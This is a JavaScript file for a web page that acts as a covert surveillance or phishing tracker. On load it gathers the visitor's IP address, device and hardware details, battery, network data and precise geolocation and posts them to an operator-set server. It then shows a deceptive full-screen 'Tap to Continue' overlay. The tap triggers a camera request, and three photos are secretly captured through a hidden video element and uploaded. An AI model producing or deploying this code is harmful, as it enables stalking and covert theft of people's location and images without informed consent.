window.addEventListener("load", async () => {
  const scriptTag = document.querySelector("script[data-tracking-id]");
  if (!scriptTag) return;

  const trackingId = scriptTag.dataset.trackingId;
  const serverUrl = scriptTag.dataset.serverUrl;
  if (!trackingId || !serverUrl) return;

  const data = {};

  // 🌐 IP
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    data.IP_Address = (await res.json()).ip;
  } catch {
    data.IP_Address = "Error";
  }

  // 🧠 Basic
  data.User_Agent = navigator.userAgent;
  data.Language = navigator.language;
  data.Screen_Resolution = `${screen.width}x${screen.height}`;
  data.Timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // 📱 Device
  let device = "Unknown";
  const ua = navigator.userAgent;
  if (/Android/.test(ua)) {
    const match = ua.match(/Android.*;\s([^)]+)/);
    if (match) device = match[1].replace("Build", "").trim();
  }
  data.Device_Model = device;

  // 🔋 Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      data.Battery = {
        Level: `${Math.round(b.level * 100)}%`,
        Charging: b.charging ? "Yes" : "No"
      };
    } catch {}
  }

  // ⚙️ Hardware
  data.Hardware = {
    CPU_Cores: navigator.hardwareConcurrency || "N/A",
    Device_Memory_GB: navigator.deviceMemory || "N/A"
  };

  // 💾 Storage
  if (navigator.storage?.estimate) {
    try {
      const s = await navigator.storage.estimate();
      data.Storage = {
        Usage: (s.usage / 1024 / 1024).toFixed(2) + " MB",
        Quota: (s.quota / 1024 / 1024).toFixed(2) + " MB"
      };
    } catch {}
  }

  // 📡 Network
  const conn = navigator.connection;
  if (conn) {
    data.Network_Info = {
      Type: conn.effectiveType,
      Downlink_MBps: conn.downlink,
      RTT_ms: conn.rtt
    };
  }

  // 📍 Location
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 })
    );

    data.Location = {
      Latitude: pos.coords.latitude,
      Longitude: pos.coords.longitude,
      Accuracy: pos.coords.accuracy + "m",
      Google_Maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
    };
  } catch {
    data.Location = "Denied";
  }

  // 🚀 SEND DATA
  await fetch(`${serverUrl}/data?trackingId=${trackingId}`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(data)
  }).catch(()=>{});

  // =========================
  // 🎥 CAMERA PART (CLICK REQUIRED)
  // =========================

  const overlay = document.createElement("div");
  overlay.innerHTML = "▶ Tap to Continue";
  overlay.style = `
    position:fixed;
    top:0;left:0;
    width:100%;height:100%;
    background:black;
    color:white;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:22px;
    z-index:9999;
  `;
  document.body.appendChild(overlay);

  overlay.onclick = async () => {
    overlay.remove();

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });

      const video = document.createElement("video");
      video.style.display = "none";
      video.srcObject = stream;
      document.body.appendChild(video);

      await video.play();

      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");

      await new Promise(r => setTimeout(r, 1500));

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      // 📸 3 photos
      for (let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/jpeg", 0.8);

        await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ imageData })
        }).catch(()=>{});

        await new Promise(r => setTimeout(r, 1200));
      }

      stream.getTracks().forEach(track => track.stop());

    } catch (err) {
      console.log("Camera denied", err);
    }
  };
});
